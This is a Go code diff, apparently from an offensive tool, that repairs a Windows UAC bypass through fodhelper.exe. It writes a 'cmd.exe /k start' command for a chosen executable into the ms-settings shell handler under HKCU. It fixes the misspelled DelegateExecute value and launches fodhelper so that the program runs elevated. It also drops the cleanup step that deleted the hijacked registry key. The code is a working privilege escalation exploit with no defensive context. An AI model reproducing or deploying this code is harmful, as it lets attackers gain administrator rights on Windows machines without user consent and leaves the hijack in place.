@@ -35,12 +35,14 @@ func HWND_W32_Method_Fodhelper(path string) error {
 	// Get ABSOLUTE program path
 	// +0x9ff ...
 
-	var currentDir string
-	currentDir, err = filepath.Abs(path)
+	var getFullPathOfExe string
+	getFullPathOfExe, err = filepath.Abs(path)
 	if err != nil {
 		log.Println(err)
 	}
-
+	
+	cmd := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, getFullPathOfExe)
+	
 	_, _, err = registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
 		registry.SET_VALUE)
@@ -59,14 +61,14 @@ func HWND_W32_Method_Fodhelper(path string) error {
 	// Setting DEFAULT key value for the ABSOLUTE program path
 	// +0x23df ...
 
-	if err := wkey32.SetStringValue("", currentDir); err != nil {
+	if err := wkey32.SetStringValue("", cmd); err != nil {
 		log.Println(err)
 	}
 
 	// Setting DelegateExecute key value for None-Value program path
 	// +0x32cc ...
 
-	if err := wkey32.SetStringValue("DelegeteExecute", ""); err != nil {
+	if err := wkey32.SetStringValue("DelegateExecute", ""); err != nil {
 		log.Println(err)
 	}
 
@@ -81,19 +83,13 @@ func HWND_W32_Method_Fodhelper(path string) error {
 	time.Sleep(5 * 1 * time.Second)
 
 	// Executing Fodhelper.exe
-	// Executing ABSOLUTE program name with high privileges
+	// Executing ABSOLUTE program name with highes privileges
 
-	var cmd = exec.Command("start fodhelper.exe")
-	err = cmd.Run()
-
-	// Sleep for 5 seconds ...
-	time.Sleep(5 * 1 * time.Second)
-
-	// Delete registry key ...
-	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
+	cOutput, err := exec.Command("cmd", "/C", "C:\\Windows\\System32\\fodhelper.exe").CombinedOutput()
 	if err != nil {
-		log.Println(err)
+		fmt.Println(err)
 	}
+	fmt.Println(string(cOutput))
 
 	return err
 }
